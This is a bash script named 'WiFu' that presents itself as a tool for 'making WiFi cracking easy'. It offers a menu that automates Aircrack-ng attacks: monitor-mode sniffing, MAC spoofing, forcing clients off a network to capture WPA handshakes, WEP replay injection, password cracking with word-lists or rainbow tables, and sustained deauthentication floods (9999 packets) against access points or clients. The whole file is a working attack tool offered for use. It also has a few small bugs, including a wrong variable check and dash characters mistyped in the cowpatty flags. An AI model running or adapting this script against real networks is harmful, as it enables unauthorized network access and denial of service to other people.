#!/bin/bash

##################################################################################################
# WiFu is a simple bash script that uses the Aircrack-ng suite to make WiFi cracking a breeze... #
#                                                                                                #
# v1.0 By:thaGH05T Email support questions to admin@ghostlyhaks.com                               #
##################################################################################################
# This program is free software; you can redistribute it and/or modify it under the terms of the # 
# GNU General Public License as published by the Free Software Foundation; either version 2 of   # 
# the License, or any later version.                                                             #
#                                                                                                #
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;      #
# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See  #
# the GNU General Public License for more details.                                               #
#                                                                                                #
# You should have received a copy of the GNU General Public License along with this program; if  #
# not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,     #
# MA  02110-1301, USA.                                                                           #
##################################################################################################

######### Start by clearing the terminal.

clear

############### Catch ctrl-c input from user

trap main 2

############# Set global functions

main () {

clear

echo -e "

\e[1;34m[*]\e[0m Please wait while we clean up your mess...

"

airmon-ng stop mon0 >>.trash.txt

if [[ -e .trash.txt ]] ; then

rm .trash.txt

fi

if [[ -e .wifi.kate-swp ]] ; then

rm .wifi.kate-swp

fi

sleep 3

bash ${0}

kill $$

}

########### Loop for main menu

mainmenu=1

while [[ $mainmenu == 1 ]] ; do

# Run only as root.

if [ "$(id -u)" != "0" ]; then

    echo -e "
    
    \e[1;31m[!]\e[0m \e[1;5m This script must be run as root!!! \e[0m
    
    "

exit 1

else

    clear

fi

########### Create variable for the title.

atitle="

\e[31m############################################\e[0m
\e[31m#\e[0m          \e[34mWiFu v1.0 - By:thaGH05T\e[0m         \e[31m#\e[0m
\e[31m#\e[0m                                          \e[31m#\e[0m
\e[31m#\e[0m  \e[34mFor support email john@ghostlyhaks.com\e[0m  \e[31m#\e[0m
\e[31m#\e[0m                                          \e[31m#\e[0m
\e[31m#\e[0m   \e[34mMaking WiFi cracking easy since 2013\e[0m   \e[31m#\e[0m
\e[31m############################################\e[0m

\e[31m                    (          
           (  (           )\ )       
           )\))(   ' (   (()/(   (   
          ((_)()\ )  )\   /(_)) ))\  
          _(())\_)()((_) (_))_|/((_)          
          \ \((_)/ / (_) | |_ (_))(  
           \ \/\/ /  | | | __|| || | 
            \_/\_/   |_| |_|   \_,_| \e[0m
            
            
         
Press \e[1;31mCtrl+C\e[0m at any time to quit and return to the main menu.

Wich attack would you like to launch first???
         
"

################### Set the prompt

prompt="Option: "

################### Set options

options=("Just Listen" "Just Crack" "Spoof MAC" "WPA" "WEP" "DOS" "Main Menu" "Quit")

echo -e "$atitle"

PS3="
$prompt"

#################### What each option does

select opt in "${options[@]}" ; do

    case $opt in
    
###################### Start Just Listen
    
	"Just Listen")
	
	jl=1
	
	while [[ $jl == 1 ]] ; do
	
	clear
	
	echo -e
	
	ifconfig | grep wlan
	
	echo -e "
	
	\e[1;34m[*]\e[0m Wich of the above wireless interfaces would you like to put in monitor mode? [wlan0]
	
	"
	
	read card
	
	    if [[ $card == "" ]] ; then
	    
		card=wlan0
		
	    fi
	
	    if [[ $card == wlan* ]] ; then
	    
		echo -e "
		
	Press \e[1;31mCtrl+C\e[0m at any time to quit and return to the main menu.
		
		"
	    
		sleep 2
	    
		airmon-ng start $card >>.trash.txt
		
		airodump-ng mon0
		
		jl=0
		
	    else
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m Not a valid wireless device. Please try again."
		
		sleep 3
		
	    fi
	    
	done
	
	;;
	
##################### Start Just Crack
	
	"Just Crack")
	
	jc=1
	
	while [[ $jc == 1 ]] ; do
	
	    clear 
	    
	    echo -e "
	    
	\e[1;34m[*]\e[0m What would you like to do? [1|2]
	    
	    1) Use pre-computed rainbow tables.
	    
	    2) Use dictionary file or word-list.
	    
	    "
	    
	    read crack
	    
	    if [[ $crack == 1 ]] ; then
	    
	    clear
	    
	    echo -e "
	    
	\e[1;34m[*]\e[0m OK, Using pre computed rainbow tables.
	    
	    "
	    
	    sleep 3
	    
	    clear
	    
	    echo -e "
	    
	\e[1;34m[*]\e[0m What is the ESSID of the targeted network? (If the target network name has spaces make sure to place it in quotations)
	    
	    "
	    
	    read essid
	    
	    echo -e "
	    
	\e[1;34m[*]\e[0m What is the absolute path to the rainbow tables you will be using? (You may drag-n-drop the file to populate, but do not leave trailing spaces!)
	    
	    "
	    
	    read rt
	    
	    echo -e "
	    
	\e[1;34m[*]\e[0m What is the absolute path to the capture file you want to crack? (You may drag-n-drop the file to populate, but do not leave trailing spaces!)
	    
	    "
	    
	    read cap
	    
	    cowpatty –s $essid –d $rt –r $cap || { echo -e '

	\e[1;31m[!]\e[0m Operation failed! Program will now exit.

	    ' ; exit 1; }
	    
	    jc=0
	    
	    elif [[ $crack == 2 ]] ; then
	    
	     clear
	    
	     echo -e "
	     
	\e[1;34m[*]\e[0m Ok, using dictionary or word-list
	     
	     "
	     
	     sleep 3
	     
	     clear
	     
	     echo -e "
	     
	\e[1;34m[*]\e[0m What is the absolute path to the dictionary or word-list you want to use? (You may drag-n-drop the file to populate, but do not leave trailing spaces!)
	     
	     "
	     
	     read word
	     
	     echo -e "
	     
	\e[1;34m[*]\e[0m What is the absolute path to the ivs file you want to crack? (You may drag-n-drop the file to populate, but do not leave trailing spaces!)
	     
	     "
	     
	     read ivs
	     
	     aircrack-ng -l ~/cracked-password.txt -w $word $ivs || { echo -e '

	\e[1;31m[!]\e[0m Operation failed! Program will now exit.

	    ' ; exit 1; }
	    
	    jc=0
	    
	    else
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m Not a valid operation. Please try again.
	    
	    "
		
		sleep 3
		
	    fi
	    
	done
	
	echo -e "
	
	\e[1;32mAll Done!!!\e[0m - If you used a dictionary or word-list and your passphrase was found then it was saved to cracked-password.txt in your home directory. If you use rainbow tables and your passphrase was found it is listed above so take the time to record it now.
	
	Press \e[1;31mCtrl+C\e[0m at any time to quit and return to the main menu.
	
	"
	
	;;
	
#################### Start Spoof MAC

	"Spoof MAC")
	
	sm=1
	
	while [[ $sm == 1 ]] ; do
	
	clear
	
	echo -e
	
	ifconfig | grep wlan
	
	echo -e "
	
	\e[1;34m[*]\e[0m Wich of the above wireless interfaces would you like to put in monitor mode? [wlan0]
	
	"
	
	read card
	
	    if [[ $card == "" ]] ; then
	    
		card=wlan0
		
	    fi

	    if [[ $card == wlan* ]] ; then
	    
		ifconfig $card down >>.trash.txt
		
		macchanger -r $card
		
		ifconfig $card up >>.trash.txt
		
		sm=0
		
	    else
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m Not a valid wireless device. Please try again."
		
		sleep 3
		
	    fi
	    
	done
	
	echo -e "
		
	All done!!! Press \e[1;31mCtrl+C\e[0m at any time to quit and return to the main menu.
		
		"
	
	;;
	
############### Start WPA
	
	"WPA")
	
	    ncard=1
	    
	    while [[ $ncard == 1 ]] ; do
	
	    clear
	
	    echo -e
	
	    ifconfig | grep wlan
	
	    echo -e "
	
	\e[1;34m[*]\e[0m Wich of the above wireless interfaces would you like to put in monitor mode? [wlan0]
	
	"
	
	    read card
	
	    if [[ $card == "" ]] ; then
	    
		card=wlan0
		
	    fi
	
	    if [[ $card == wlan* ]] ; then
	    
		clear
		
		ncard=0
		
	    else
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m Not a valid wireless device. Please try again."
		
		sleep 3
		
	    fi
	    
	    done
	
	    clear
	
	    airmon-ng start $card >>.trash.txt
	
	    echo -e "
	
	\e[1;34m[*]\e[0m New tabs will open running various commands to gather info. Come back to this tab to input data.
	
	    "
	
	    sleep 5
	
	    konsole --new-tab -e airodump-ng mon0 2>>.trash.txt
	    
	    qnet=1
	    
	    while [[ $qnet == 1 ]] ; do
	
	    echo -e "
	
	\e[1;34m[*]\e[0m What is the name of the network you want to target?
	
	    "
	
	    read net
	    
	    if [[ $net == "" ]] ; then
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	    
	    "
		
		sleep 3
	    
	    elif [[ $net == * ]] ; then
	
		clear
		
		qnet=0
		
	    fi
	    
	    done
	    
	    qone=1
	    
	    while [[ $qone == 1 ]] ; do
	
	    echo -e "
	
	\e[1;34m[*]\e[0m What is the BSSID of the network you want to target?
	
	    "
	
	    read bssid
	    
	    if [[ $bssid == "" ]] ; then
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	    
	    "
		
		sleep 3
	    
	    elif [[ $bssid == * ]] ; then
	
		clear
		
		qone=0
		
	    fi
	    
	    done
	    
	    qtwo=1
	    
	    while [[ $qtwo == 1 ]] ; do
	    
	    echo -e "
	
	\e[1;34m[*]\e[0m What channel is the network on?
	
	    "
	    
	    read chan
	    
	    if [[ $chan == "" ]] ; then
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	    
	    "
		
		sleep 3
	    
	    elif [[ $chan == * ]] ; then
	    
		clear
		 
		qtwo=0
		
	    fi
	    
	    done
	    
	    qthree=1
	    
	    while [[ $qthree == 1 ]] ; do
	    
	    echo -e "
	
	\e[1;34m[*]\e[0m What do you want to name the capture file?
	
	    "
	
	    read name
	    
	    if [[ $name == "" ]] ; then
	
		    clear
	    
		    echo -e "
		
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	    
	    "
		
		    sleep 3
		
	    elif [[ $name == * ]] ; then
	    
	    qthree=0
	    
	    fi
	    
	    done
	    
	    clear
	
	    echo -e "
	
	\e[1;34m[*]\e[0m You now have 10 seconds to close the previousely opened tab. GO!
	
	    "
	
	    sleep 10
	
	    clear
	
	    howonetwo=1
	
	    while [[ $howonetwo == 1 ]] ; do
	    
	    clear
	    
		echo -e "
	
	\e[1;34m[*]\e[0m How do you plan on cracking the capture file? [1|2]
	
	    1) With pre-computed rainbow tables.
	    
	    2) Wth a dictionary file or word-list.
	
	"
	
		read how
	
		if [[ $how == "1" ]] ; then
	
		    konsole --new-tab -e airodump-ng -c $chan -w $name --bssid $bssid mon0 2>>.trash.txt
	    
		    howonetwo=0
	    
		elif [[ $how == "2" ]] ; then
	
		    konsole --new-tab -e airodump-ng -c $chan -w $name --bssid $bssid --ivs mon0 2>>.trash.txt
	    
		    howonetwo=0
	    
		else
	
		    clear
	    
		    echo -e "
		
	\e[1;31m[!]\e[0m Not a valid operation. Please try again.
	    
	    "
		
		    sleep 3
		
		fi
	
	    done
	
	    clear
	    
	    echo -e "
	
	\e[1;34m[*]\e[0m OK, lets try and deauthenticate a client to get the handshake. What is the station ID?
	
	"
	
	    read client
	    
	    handyn=1
	
	    while [[ $handyn == 1 ]] ; do
	
	    echo -e
	
	    aireplay-ng -0 10 -a $bssid -c $client mon0
	
	    echo -e "
	
	\e[1;34m[*]\e[0m Look in the window that was opened a minute ago and see if the handshake appeared at the top.
	
	"
	
		echo -e "
	
	\e[1;34m[*]\e[0m Did the handshake appear? [y|n|new]
	
	"
	
		read hand
	
		if [[ $hand == y ]] ; then
		
		    clear
	
		    echo -e "
	
	\e[1;34m[*]\e[0m OK, time to crack the capture file!
	
	"
	
		    sleep 3
	
		    handyn=0
	
		elif [[ $hand == n ]] ; then
		
		clear
	
		    echo -e "
	
	\e[1;34m[*]\e[0m OK, lets try again. If you do not recieve a handshake after a few more tries you can type [new] to deauthenticate a different client or you can press \e[1;31mCtrl+C\e[0m to go back to the main menu.
	
	"
	
		    sleep 5
		    
		    clear
	
		elif [[ $hand == new ]] ; then
		
		clear
		
		echo -e "
	
	\e[1;34m[*]\e[0m OK, lets try and deauthenticate a client to get the handshake. What is the station ID?
	
	"
	
	    read client
	
		else
	
		    clear
	
		    echo -e "
	
	\e[1;31m[!]\e[0m Invalid operation. Please try again.
	
	"
	
		fi

	    done
	
	if [[ $how == 1 ]] ; then
	
	    where=1
	    
	    while [[ $where == 1 ]] ; do
	
		echo -e "
	    
	\e[1;34m[*]\e[0m What is the absolute path to the rainbow tables you will be using? (You may drag-n-drop the file to populate, but do not leave trailing spaces!)
	    
	    "
	    
		read rt
	    
		if [[ $rt == "" ]] ; then
		
		    clear
	
		    echo -e "
	
	\e[1;31m[!]\e[0m Invalid file path. Please try again.
	
	"
		    
		else
		
		    clear
		    
		    where=0
		    
		fi
		
		done
	
	    cowpatty –s $net –d $rt –r ~/$name-01.cap || { echo -e '

	\e[1;31m[!]\e[0m Operation failed! Program will now exit.

	    ' ; exit 1; }
	    
	    elif [[ $how == 2 ]] ; then
	    
		what=1
		
		while [[ $what == 1 ]] ; do
	    
		    echo -e "
	     
	\e[1;34m[*]\e[0m What is the absolute path to the dictionary or word-list you want to use? (You may drag-n-drop the file to populate, but do not leave trailing spaces!)
	     
	     "
	     
		    read word
		    
		    if [[ $word == "" ]] ; then
		    
			clear
	
			echo -e "
	
	\e[1;31m[!]\e[0m Invalid file path. Please try again.
	
	"
		    
		    else
		
			clear
		    
			what=0
		    
		    fi
		    
		    done
		    
		    aircrack-ng -l ~/cracked-password.txt -w $word ~/$name-01.ivs || { echo -e '

	\e[1;31m[!]\e[0m Operation failed! Program will now exit.

	    ' ; exit 1; }
	    
	    fi
	    
	    echo -e "
	
	\e[1;32mAll Done!!!\e[0m - If you used a dictionary or word-list and your passphrase was found then it was saved to cracked-password.txt in your home directory. If you used rainbow tables and your passphrase was found it is listed above so take the time to record it now.
	
	Press \e[1;31mCtrl+C\e[0m at any time to quit and return to the main menu.
	
	"
	
	;;
	
##################### Start WEP
	
	"WEP")
	
	    ncard=1
	    
	    while [[ $ncard == 1 ]] ; do
	
	    clear
	
	    echo -e
	
	    ifconfig | grep wlan
	
	    echo -e "
	
	\e[1;34m[*]\e[0m Wich of the above wireless interfaces would you like to put in monitor mode? [wlan0]
	
	"
	
	    read card
	
	    if [[ $card == "" ]] ; then
	    
		card=wlan0
		
	    fi
	
	    if [[ $card == wlan* ]] ; then
	    
		clear
		
		ncard=0
		
	    else
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m Not a valid wireless device. Please try again."
		
		sleep 3
		
	    fi
	    
	    done
	
	    clear
	
	    airmon-ng start $card >>.trash.txt
	
	    echo -e "
	
	\e[1;34m[*]\e[0m New tabs will open running various commands to gather info. Come back to this tab to input data.
	
	    "
	
	    sleep 5
	
	    konsole --new-tab -e airodump-ng mon0 2>>.trash.txt
	    
	    qone=1
	    
	    while [[ $qone == 1 ]] ; do
	
	    echo -e "
	
	\e[1;34m[*]\e[0m What is the BSSID of the network you want to target?
	
	    "
	
	    read bssid
	    
	    if [[ $bssid == "" ]] ; then
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	    
	    "
		
		sleep 3
	    
	    elif [[ $bssid == * ]] ; then
	
		clear
		
		qone=0
		
	    fi
	    
	    done
	    
	    qtwo=1
	    
	    while [[ $qtwo == 1 ]] ; do
	    
	    echo -e "
	
	\e[1;34m[*]\e[0m What channel is the network on?
	
	    "
	    
	    read chan
	    
	    if [[ $chan == "" ]] ; then
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	    
	    "
		
		sleep 3
	    
	    elif [[ $chan == * ]] ; then
	    
		clear
		 
		qtwo=0
		
	    fi
	    
	    done
	    
	    qthree=1
	    
	    while [[ $qthree == 1 ]] ; do
	    
	    echo -e "
	
	\e[1;34m[*]\e[0m What do you want to name the capture file?
	
	    "
	
	    read name
	    
	    if [[ $name == "" ]] ; then
	
		    clear
	    
		    echo -e "
		
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	    
	    "
		
		    sleep 3
		
	    elif [[ $name == * ]] ; then
	    
	    qthree=0
	    
	    fi
	    
	    done
	    
	    clear
	
	    echo -e "
	
	\e[1;34m[*]\e[0m You now have 10 seconds to close the previousely opened tab. GO!
	
	    "
	
	    sleep 10
	
	    clear
	    
	    konsole --new-tab -e airodump-ng -c $chan -w $name --bssid $bssid mon0 2>>.trash.txt
	
	    echo -e "
	
	\e[1;34m[*]\e[0m OK, now starting WEP attack?
	
	"
	
	    konsole --new-tab -e aireplay-ng -1 0 -a $bssid mon0
	    
	    clear
	    
	    konsole --new-tab -e aireplay-ng -3 -b $bssid mon0
	
	    echo -e "
	
	\e[1;34m[*]\e[0m Wait a minute or two and watch the data rise in the first window that initially opened.
	
	"
	
	    sleep 3
	    
	    dat=1
	    
	    while [[ $dat == 1 ]] ; do
	
	    echo -e "
	
	\e[1;34m[*]\e[0m Has the data risen to over 5K? [y|n]
	
	"
	
		read data
	
		if [[ $data == y ]] ; then
		
		    clear
	
		    echo -e "
	
	\e[1;34m[*]\e[0m OK, time to crack the capture file!
	
	"
	
		    sleep 3
	
		    dat=0
	
		elif [[ $hand == n ]] ; then
		
		clear
	
		    echo -e "
	
	\e[1;34m[*]\e[0m OK, lets try again. You can press \e[1;31mCtrl+C\e[0m to go back to the main menu.
	
	"
	
		    sleep 3
		    
		    clear

		else
	
		    clear
	
		    echo -e "
	
	\e[1;31m[!]\e[0m Invalid operation. Please try again.
	
	"
	
		fi

	    done
	
	
	    aircrack-ng -l ~/cracked-password.txt ~/$name-01.cap || { echo -e '

	\e[1;31m[!]\e[0m Operation failed! Program will now exit.

	    ' ; exit 1; }
	    
	    echo -e "
	
	\e[1;32mAll Done!!!\e[0m - If your passphrase was found then it is shown above and was saved to cracked-password.txt in your home directory.
	
	Press \e[1;31mCtrl+C\e[0m at any time to quit and return to the main menu.
	
	"
	
	;;
	
############### Start DOS
	
	"DOS")
	
	ncard=1
	    
	    while [[ $ncard == 1 ]] ; do
	
	    clear
	
	    echo -e
	
	    ifconfig | grep wlan
	
	    echo -e "
	
	\e[1;34m[*]\e[0m Wich of the above wireless interfaces would you like to put in monitor mode? [wlan0]
	
	"
	
	    read card
	
	    if [[ $card == "" ]] ; then
	    
		card=wlan0
		
	    fi
	
	    if [[ $card == wlan* ]] ; then
	    
		clear
		
		ncard=0
		
	    else
	    
		clear
	    
		echo -e "
		
	\e[1;31m[!]\e[0m Not a valid wireless device. Please try again."
		
		sleep 3
		
	    fi
	    
	    done
	
	    clear
	
	    airmon-ng start $card >>.trash.txt
	
	    echo -e "
	
	\e[1;34m[*]\e[0m New tabs will open running various commands to gather info. Come back to this tab to input data.
	
	    "
	
	    sleep 5
	
	    konsole --new-tab -e airodump-ng mon0 2>>.trash.txt
	    
	    deny=1
	    
	    while [[ $deny == 1 ]] ; do
	    
		echo -e "
	    
	\e[1;34m[*]\e[0m Who is the victim of this attack? [1|2]
	
	    1) Access Point.
	    
	    2) Connected Client.
	    
	    "
	    
		read who
		
		if [[ $who == "1" ]] ; then
		
		    clear
		    
		    deny=0
		    
		elif [[ $who == "2" ]] ; then
		
		    clear
		    
		    deny=0
		    
		else
		
		echo -e "
		    
	\e[1;31m[!]\e[0m $who is not a valid entry. Please try again.
	
	    "
	    
		    sleep 3
		    
		fi
		
	    done
	    
	    if [[ $who == "1" ]] ; then
	    
		qone=1
		
		while [[ $qone == 1 ]] ; do
	    
		    echo -e "
		
	\e[1;34m[*]\e[0m What is the BSSID of the acces point you want to attack?
	
	"
		    read bssid
		    
		    if [[ $bssid == "" ]] ; then
		    
			echo -e "
		    
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	
	"
	
			sleep 3
			
		    elif [[ $bssid == * ]] ; then
		    
			echo -e "
			
	\e[1;34m[*]\e[0m OK. Now starting the DOS attack.
	
	"
	
	sleep 3
	
			aireplay-ng -0 9999 -a $bssid mon0 || { echo -e '

	\e[1;31m[!]\e[0m Operation failed! Program will now exit.
	
	 ' ; exit 1; }
	 
		    fi
		    
		done
		
	    else
	    
		qtwo=1
		
		while [[ $qtwo == 1 ]] ; do
	    
		    echo -e "
		
	\e[1;34m[*]\e[0m What is the BSSID of the acces point you want to attack?
	
	"
		    read bssid
		    
		    if [[ $bssid == "" ]] ; then
		    
			echo -e "
		    
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	
	"
	
			sleep 3
			
		    elif [[ $bssid == * ]] ; then
		    
			clear
			
			qtwo=0
			
		    fi
		    
		done
		
		qthree=1
		
		while [[ $qthree == 1 ]] ; do
		
		    echo -e "
		
	\e[1;34m[*]\e[0m What is the clients station ID?
	
	"
		    read station
		    
		    if [[ $station == "" ]] ; then
		    
			echo -e "
		    
	\e[1;31m[!]\e[0m You didn't type anything. Please try again.
	
	"
	
			sleep 3
			
		    elif [[ $station == * ]] ; then
		    
			clear
			
			qthree=0
			
		    fi
		    
		done
		
		fi
		
		echo -e "
		
		\e[1;34m[*]\e[0m OK. Now starting the DOS attack.
		
		"
		
		sleep 3
		
	    aireplay-ng -0 9999 -a $bssid -c $station mon0 || { echo -e '

	\e[1;31m[!]\e[0m Operation failed! Program will now exit.
	
	 ' ; exit 1; }
	    
	;;
	
###################### Start Main Menu
	
	"Main Menu")
	
	    break
	
	;;
	
################### Start Quit
	
	"Quit")
	
	clear
	
	echo -e "
	
	\e[5;31mT\e[5;32mh\e[5;33ma\e[5;34mn\e[5;35mk \e[5;36mY\e[5;37mo\e[5;31mu \e[5;32mF\e[5;33mo\e[5;34mr \e[5;35mU\e[5;36ms\e[5;37mi\e[5;31mn\e[5;31mg \e[5;32mW\e[5;33mi\e[5;34mF\e[5;35mu\e[5;36m!\e[5;37m!\e[5;31m!\e[0m
	
	"
	
	exit 1
	
	;;
	
	*)
	
	echo -e "
	
	\e[1;31m[!]\e[0m Please choose a valid operation..."
	
	sleep 3
	
	break
	
esac
	
    done
    
done